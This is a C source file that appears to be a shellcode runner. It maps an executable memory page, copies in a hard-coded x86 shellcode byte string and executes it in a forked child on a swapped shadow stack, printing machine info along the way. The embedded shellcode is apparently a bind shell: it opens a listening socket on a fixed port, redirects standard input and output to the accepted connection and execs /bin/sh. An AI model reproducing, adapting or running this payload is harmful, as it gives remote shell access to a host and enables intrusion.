#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "regs/state.h"

#ifndef unused
#define unused(x) ((void)(x))
#endif

#ifndef SHADOW_STACK_SIZE
#define SHADOW_STACK_SIZE (1024 * 4)
#endif

int main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int ret, wstatus;
  pid_t pid;
  struct utsname uts;
  char *pcall;
  char *thread_stack;
  char *shadow_stack;
  char *shellcode = "\x33\xf6\x33\xdb\x43\x43\x33\xc9"
                    "\x41\x41\x33\xd2\x83\xc2\x06\x33"
                    "\xc0\xb0\xe6\x56\x52\x51\x53\x50"
                    "\xcd\x91\x8b\xf8\x33\xd2\x42\xc1"
                    "\xe2\x04\x56\x33\xc9\x66\xb9\x26"
                    "\xaa\x66\x51\x33\xc9\x41\x41\x66"
                    "\x51\x8b\xcc\x56\x52\x51\x57\x33"
                    "\xc0\xb0\xe8\x50\xcd\x91\x56\x56"
                    "\x57\x33\xc0\xb0\xe9\x50\xcd\x91"
                    "\x56\x56\x56\x57\x33\xc0\xb0\xea"
                    "\x50\xcd\x91\x8b\xf8\x56\x33\xd2"
                    "\x52\x33\xc9\x83\xc1\x09\x51\x57"
                    "\x33\xc0\xb0\x3e\x50\xcd\x91\x56"
                    "\x33\xd2\x42\x52\x33\xc9\x83\xc1"
                    "\x09\x51\x57\x33\xc0\xb0\x3e\x50"
                    "\xcd\x91\x56\x33\xd2\x42\x42\x52"
                    "\x33\xc9\x83\xc1\x09\x51\x57\x33"
                    "\xc0\xb0\x3e\x50\xcd\x91\x56\x68"
                    "\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
                    "\x69\x8b\xdc\x56\x53\x8b\xcc\x56"
                    "\x56\x51\x53\x33\xc0\xb0\x3b\x50"
                    "\xcd\x91";

  pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
               MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  if (pcall == MAP_FAILED) {
    perror("mmap()");
    ret = -1;
    goto __fallback;
  }

  shadow_stack = calloc(SHADOW_STACK_SIZE, sizeof(char));

  if (!shadow_stack) {
    perror("calloc()");
    ret = -1;
    goto __must_unmap_payload;
  }

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    goto __must_unmap_shadow_stack;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  printf("[*] Copying shellcode info crafted buffer.\n");
  memcpy(pcall, shellcode, strlen(shellcode));

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  printf("[*] Creating trivial sandbox..\n");

  pid = fork();

  if (pid < 0) {
    perror("fork()");
    ret = pid;
    goto __must_unmap_shadow_stack;
  }

  if (!pid) {
    printf("[*] Saving thread stack..\n");
    __asm__ __volatile__("movl %%esp, %0\n" : "=r"(thread_stack));

#ifdef THREAD_STACK
    printf("Debug\n");
    printf(" [*] thread_stack: %p\n", thread_stack);
    printf(" [*] shadow_stack: %p\n", shadow_stack);
#endif

    printf("[*] Installing shadow stack..\n");
    __asm__ __volatile__("movl %0, %%edi\n"
                         "xchgl %%edi, %%esp\n"
                         :
                         : "r"((unsigned long)shadow_stack));

    printf("[*] Executing the shellcode and restoring stack..\n");
    __asm__ __volatile__("call *%%eax\n"
                         "movl %0, %%edi\n"
                         "xchgl %%edi, %%esp\n"
                         :
                         : "r"((unsigned long)thread_stack), "a"(pcall));
  } else {
    waitpid(-1, &wstatus, 0);
  }

  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  printf("[*] Cleaning up..\n");
  free(shadow_stack);
  munmap(pcall, sysconf(_SC_PAGESIZE));

  return 0;

__must_unmap_shadow_stack:
  free(shadow_stack);

__must_unmap_payload:
  munmap(pcall, sysconf(_SC_PAGESIZE));

__fallback:
  return ret;
}
